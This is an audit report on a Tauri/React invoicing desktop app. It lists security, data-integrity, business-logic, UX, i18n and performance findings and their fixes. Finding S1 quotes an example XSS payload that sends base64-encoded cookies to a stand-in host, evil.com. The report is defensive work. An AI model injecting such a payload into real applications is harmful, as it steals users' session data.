# Invoy Project Audit Report

**Date:** 2026-08-30
**App:** Invoy v2.0.0 — Algerian commercial management desktop app
**Stack:** Tauri v2 + React 18 + Vite 5 + Tailwind 3
**Scope:** Full codebase review — Security, Data Integrity, Business Logic, UX/Accessibility, i18n, Performance, Code Quality

---

## Executive Summary

4 parallel deep reviews covering 120+ files. **48 actionable findings** across 7 phases. 3 critical security issues, 8 high-severity data integrity issues, 9 business logic issues, 9 UX issues, 5 i18n issues, 5 performance issues, 5 code quality issues.

**Verdict: Changes Requested** — security and data integrity issues must be fixed before production use.

---

## Phase 1: Security

### S1 — XSS in PDF Templates [CRITICAL]
- **File:** `src/utils/pdfTemplate.js:65-309`
- **Issue:** Every user-supplied field (`client.nom`, `client.adresse`, `settings.organisation`, `articles[].designation`, `notes`) is interpolated raw into HTML template literals via `${...}`. No escaping is performed.
- **Attack:** User creates client with `nom` = `<img src=x onerror="fetch('https://evil.com/steal?data='+btoa(document.cookie))">`. When PDF is exported, this HTML loads in a hidden WebView2 with CSP disabled.
- **Impact:** Stored XSS executed at PDF-render time. With `fs:**` permissions, injected scripts could read/write任意 files.
- **Fix:** Add `escapeHtml()` utility function. Apply to every `${...}` user input in all 5 PDF template builders.

### S2 — CSP Disabled [CRITICAL]
- **File:** `src-tauri/tauri.conf.json:27`
- **Issue:** `"csp": null` — Content Security Policy completely disabled. Any injected content can execute arbitrary scripts, load remote resources, exfiltrate data.
- **Fix:** Set `"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"`.

### S3 — Unrestricted Filesystem [CRITICAL]
- **File:** `src-tauri/capabilities/default.json:12-31`
- **Issue:** All `fs:allow-read-file`, `fs:allow-write-file` permissions use `"path": "**"`. Frontend can read/write ANY file on disk (SSH keys, browser cookies, system files).
- **Fix:** Narrow scope to `$APPDATA/**`, `$DOWNLOAD/**`, `$DOCUMENT/**`.

### S4 — Incomplete URL Encoding [VERIFIED FALSE POSITIVE ✅]
- **File:** `src-tauri/src/pdf.rs:211-215`
- **Status:** NOT a bug. The catch-all `_ => format!("%{:02X}", b)` on line 214 handles ALL characters not in the explicit allowlist, including `#`, `?`, `%`, `+`, `&`, `=`. Only `A-Z`, `a-z`, `0-9`, `-`, `_`, `.`, `~`, `!`, `*`, `'`, `(`, `)` pass through unencoded.

### S5 — Error Messages Leak Paths [HIGH]
- **File:** `src-tauri/src/pdf.rs:173,183,187,225`
- **Issue:** `format!("failed to write PDF: {e}")` returns OS error strings with full filesystem paths to frontend.
- **Fix:** Sanitize error messages before returning.

### S6 — Backup Import No Validation [HIGH]
- **File:** `src/pages/Parametres.jsx:124-141`
- **Issue:** Import only checks `backup.version` and `backup.settings` exist. No type validation. Crafted JSON can inject XSS payloads (via `settings.organisation`) or corrupt store structure.
- **Fix:** Validate every field type, strip `__proto__` keys, limit array sizes.

### S7 — Logo Upload No Content Validation [MEDIUM]
- **File:** `src/tauriApi.js:71-83`
- **Issue:** File filter checks extension only (`png, jpg, jpeg, gif, webp`), not content. HTML file renamed `.png` = stored as `data:text/html,...` = XSS when used as `<img src>` in PDF template.
- **Fix:** Validate magic bytes (PNG: `89504E47`, JPEG: `FFD8FF`), reject non-image content, limit file size.

---

## Phase 2: Data Integrity

### D1 — Counter Key Mismatch [HIGH]
- **File:** `src/pages/Parametres.jsx:36-38` vs `src/pages/BonLivraison.jsx:44`, `src/pages/BonVersement.jsx:48`
- **Issue:** Parametres displays `counters.livraison` and `counters.versement`. But BonLivraison writes `counters.bonLivraison` and BonVersement writes `counters.bonVersement`. Counter display shows 0 always for these types. Resetting counters resets wrong keys.
- **Fix:** Unify key names across all pages.

### D2 — Restore Without Pre-Backup [HIGH]
- **File:** `src/pages/Parametres.jsx:124-141`
- **Issue:** Import overwrites all 6 store keys without creating a backup first. If import file is corrupted, current data is permanently lost.
- **Fix:** Auto-export current data to temp file before restore.

### D3 — No Error Handling for Store Corruption [HIGH]
- **File:** All page components, `src/tauriApi.js:50-54`
- **Issue:** Zero try/catch around `storeGet` calls. If `invoy-data.json` is corrupted (invalid JSON), LazyStore throws and entire app crashes with no recovery.
- **Fix:** Wrap store reads in try/catch, fall back to defaults, show recovery UI.

### D4 — No Atomic Writes [MEDIUM]
- **File:** `src/tauriApi.js:60`
- **Issue:** `store.save()` writes directly to `invoy-data.json`. Crash during write = corrupted file.
- **Fix:** Write to temp file, then rename (atomic on NTFS).

### D5 — Counter TOCTOU Race [MEDIUM]
- **File:** `src/pages/FactureProforma.jsx:90-113`
- **Issue:** Counter is read, used, then written back. Two rapid exports can read same value → duplicate invoice numbers.
- **Fix:** Use mutex or queue counter operations.

### D6 — clearAllData Not Atomic [MEDIUM]
- **File:** `src/pages/Parametres.jsx:58-63`
- **Issue:** `Promise.all` writes 6 keys in parallel. If one fails, partial wipe.
- **Fix:** Wrap in try/catch, restore on failure.

### D7 — History Race Condition [MEDIUM]
- **File:** `src/utils/history.js:8-33`
- **Issue:** Read-modify-write on `historique` store. Two concurrent saves can lose entries.
- **Fix:** Use mutex or single atomic append.

### D8 — Client ID Collision [LOW]
- **File:** `src/pages/Clients.jsx:78`
- **Issue:** `Date.now()` alone for ID — collision on rapid creation within same ms.
- **Fix:** Add random suffix.

---

## Phase 3: Business Logic

### B1 — Delivery Notes Missing Fiscal IDs [HIGH]
- **File:** `src/utils/pdfTemplate.js:206`
- **Issue:** `buildBonLivraisonPdf` passes `showFiscal=false`. Seller's RC/NIF/NIS are NOT shown on delivery notes. In Algeria, delivery notes should display seller's fiscal identifiers.
- **Fix:** Set `showFiscal=true` for delivery notes.

### B2 — No RTL in PDF Templates [HIGH]
- **File:** `src/utils/pdfTemplate.js`
- **Issue:** All PDFs generate `<html lang="fr">` with no `dir` attribute. Arabic content renders left-to-right. Only `settings.organisation` has `dir="auto"`.
- **Fix:** Add `dir="auto"` to all user-content elements, or set `dir="rtl"` when Arabic.

### B3 — French-Only Number-to-Words [HIGH]
- **File:** `src/utils/numberToWords.js`, `src/utils/pdfTemplate.js:1,161`
- **Issue:** `numberToWordsFR` always used. Arabic users see French text in "arrêté à la somme" section.
- **Fix:** Add `numberToWordsAR` function, use based on language.

### B4 — fr-DZ Locale Unreliable [MEDIUM]
- **File:** `src/utils/pdfTemplate.js:4`, `src/pages/FactureProforma.jsx:260`
- **Issue:** `fr-DZ` locale may not exist on all Windows installs. Falls back to system default, causing inconsistent number formatting.
- **Fix:** Fallback to `fr` or use manual formatting with explicit separator.

### B5 — Per-Article Rounding Drift [MEDIUM]
- **File:** `src/components/ArticlesTable.jsx:36`
- **Issue:** `toFixed(2)` per article truncates. Sum of truncated values differs from truncating exact sum. Can drift ~1 DA on 100 articles.
- **Fix:** Round at sum level, not per article.

### B6 — Payment Slugs Not Linked to Invoices [MEDIUM]
- **File:** `src/pages/BonVersement.jsx`
- **Issue:** Payment slips are standalone. No reference to which invoice is being paid. `solde` is versement's own total, not client's actual outstanding.
- **Fix:** Add optional invoice reference field.

### B7 — Timbre Calculation Non-Standard [MEDIUM]
- **File:** `src/pages/FactureProforma.jsx:63-71`
- **Issue:** Uses tranche-based calculation. Standard is 1% of HT+TVA. May be intentional per local practice.
- **Fix:** Document the calculation method or adjust to standard.

### B8 — TVA Rate Not Clamped [LOW]
- **File:** `src/pages/FactureProforma.jsx:267`
- **Issue:** `<input type="number">` has `min="0" max="100"` but no code-level enforcement. User can enter 200%.
- **Fix:** Clamp in onChange handler.

### B9 — Negative Quantities Possible [LOW]
- **File:** `src/components/ArticlesTable.jsx:155`
- **Issue:** `min="0"` is advisory only. Programmatic input can set negative values.
- **Fix:** Clamp to ≥ 0 in onChange handler.

---

## Phase 4: UX & Accessibility

### U1 — No Unsaved Changes Guard [HIGH]
- **File:** All form pages (`FactureProforma.jsx`, `BonLivraison.jsx`, `BonVersement.jsx`, `Clients.jsx`)
- **Issue:** Navigating away via sidebar loses all unsaved form data with no confirmation. No `beforeunload` event handler.
- **Fix:** Track dirty state, add `beforeunload` + nav confirmation modal.

### U2 — No Inline Validation [HIGH]
- **File:** All form pages
- **Issue:** Only toast on submit. Empty client name exports valid PDF. No red borders, no helper text.
- **Fix:** Add field-level error states with visual feedback.

### U3 — No Loading State on Init [HIGH]
- **File:** `src/App.jsx:176`
- **Issue:** `{settings !== null && (...)}` — while settings load, user sees blank screen. No spinner/skeleton.
- **Fix:** Add loading skeleton or spinner.

### U4 — Native confirm() for Destructive Actions [MEDIUM]
- **File:** `src/pages/Parametres.jsx:44,52,130`, `src/pages/Clients.jsx:87`
- **Issue:** Native `confirm()` is unstyled, breaks dark mode, cannot include custom content.
- **Fix:** Create custom ConfirmModal component.

### U5 — Missing aria-labels [MEDIUM]
- **File:** `src/App.jsx:143`, `src/components/ArticlesTable.jsx:168`, `src/pages/Clients.jsx:500`, etc.
- **Issue:** Zero `aria-label` on 10+ icon-only buttons.
- **Fix:** Add `aria-label` to all icon buttons.

### U6 — No focus-visible Styles [MEDIUM]
- **File:** `src/index.css`
- **Issue:** No `:focus-visible` ring defined. Keyboard users can't see focus.
- **Fix:** Add focus ring styles.

### U7 — Dark Mode Hardcoded Colors [MEDIUM]
- **File:** `src/pages/FactureProforma.jsx:177`, `src/components/ArticlesTable.jsx:95,177`
- **Issue:** Hardcoded `white`, `#1e293b`, `#f0f3f9` in inline styles — break in dark mode.
- **Fix:** Use CSS variables or Tailwind classes.

### U8 — Missing color-scheme: dark [MEDIUM]
- **File:** `src/index.css`
- **Issue:** HTML element never gets `color-scheme: dark` — native controls won't auto-theme.
- **Fix:** Add `color-scheme: dark` to `html.dark`.

### U9 — Export Doesn't Auto-Open [LOW]
- **File:** `src/components/ExportButton.jsx`
- **Issue:** After export, user gets toast but file is never opened/shown.
- **Fix:** Call `revealItemInDir` after export.

---

## Phase 5: i18n

### I1 — PDF Templates Hardcoded French [HIGH]
- **File:** `src/utils/pdfTemplate.js`
- **Issue:** All document labels ("Arrêté la présente facture", "Informations client", etc.) are French. `t(lang, k)` function exists but not used in templates.
- **Fix:** Pass `lang` to template builders, use `t()` for all labels.

### I2 — 25+ Hardcoded French Strings [MEDIUM]
- **Files:** `ExportButton.jsx`, `Clients.jsx`, `Parametres.jsx`, `Produits.jsx`, `Marchandise.jsx`, `App.jsx`
- **Issue:** Many UI strings are hardcoded French, not using `t()` function.
- **Fix:** Replace with `t()` calls, add missing keys to i18n dictionary.

### I3 — Arabic Numerals Not Supported [MEDIUM]
- **File:** `src/components/ArticlesTable.jsx:165`
- **Issue:** `toLocaleString('fr-DZ')` always produces Western Arabic numerals (1,2,3). Arabic users may expect Eastern Arabic numerals (١,٢,٣).
- **Fix:** Use `ar-DZ` locale when language is Arabic.

### I4 — Export Dropdown Not RTL [LOW]
- **File:** `src/index.css:316,328`
- **Issue:** Dropdown positioned `right: 0` and `text-align: left` hardcoded.
- **Fix:** Flip positioning in RTL mode.

### I5 — Active Nav Indicator Not RTL [LOW]
- **File:** `src/App.jsx:131`
- **Issue:** Active indicator bar is always `left-0`. Should be `right-0` in RTL.
- **Fix:** Conditional positioning.

---

## Phase 6: Performance

### P1 — PDF Template Blocks Main Thread [MEDIUM]
- **File:** `src/utils/pdfTemplate.js:156-196`
- **Issue:** Builds ~5KB HTML string synchronously. For 50+ articles, blocks UI.
- **Fix:** Move to Web Worker or async chunk.

### P2 — DOCX Generation Blocks Main Thread [MEDIUM]
- **File:** `src/electron-docx/docxGenerator.js:392-434`
- **Issue:** Builds entire OOXML DOM in-browser. Complex documents freeze UI for 1-3s.
- **Fix:** Move to Web Worker.

### P3 — ArticlesTable Re-renders Every Keystroke [MEDIUM]
- **File:** `src/components/ArticlesTable.jsx:30`
- **Issue:** No `React.memo` — re-renders all rows on every keystroke in any field.
- **Fix:** Add `React.memo` to row component, `useCallback` for handlers.

### P4 — Google Fonts Blocking [LOW]
- **File:** `src/index.css:182`
- **Issue:** `@import url(...)` blocks rendering. Should be `<link rel="preload">`.
- **Fix:** Move to `index.html` `<head>` with `preload`.

### P5 — transition-all on Sidebar [LOW]
- **File:** `src/index.css:60`
- **Issue:** `transition-all` transitions unnecessary properties.
- **Fix:** Use `transition-colors`.

---

## Phase 7: Code Quality

### Q1 — Dead ping Command [LOW]
- **File:** `src-tauri/src/lib.rs:4-6`
- **Issue:** `ping` command registered but never called from frontend.
- **Fix:** Remove.

### Q2 — Dead noTableBorder Function [LOW]
- **File:** `src/electron-docx/docxGenerator.js:66-68`
- **Issue:** `noTableBorder()` defined but never called.
- **Fix:** Remove.

### Q3 — Toast Timer Leak [LOW]
- **File:** `src/App.jsx:74-77`
- **Issue:** Rapid `showToast` calls create multiple timers. First timer clears toast prematurely.
- **Fix:** Clear previous timer before creating new one.

### Q4 — Redundant Dark Mode CSS [LOW]
- **File:** `src/index.css:169-173`
- **Issue:** Re-declares variables already set by CSS custom properties on `html.dark`.
- **Fix:** Remove duplicates.

### Q5 — No Tests [INFO]
- **Issue:** No test files found. For a financial document app, unit tests for critical functions are valuable.
- **Fix:** Add tests for `numberToWords`, `pdfTemplate` builders, `calcTimbre`.

---

## Appendix: File Inventory

| Category | Files | Lines |
|----------|-------|-------|
| React Pages | 8 | ~3,500 |
| React Components | 3 | ~350 |
| Utilities | 4 | ~870 |
| DOCX Generator | 1 | ~704 |
| API Layer | 1 | ~217 |
| Rust Backend | 4 | ~250 |
| Config | 6 | ~200 |
| **Total** | **27** | **~6,080** |
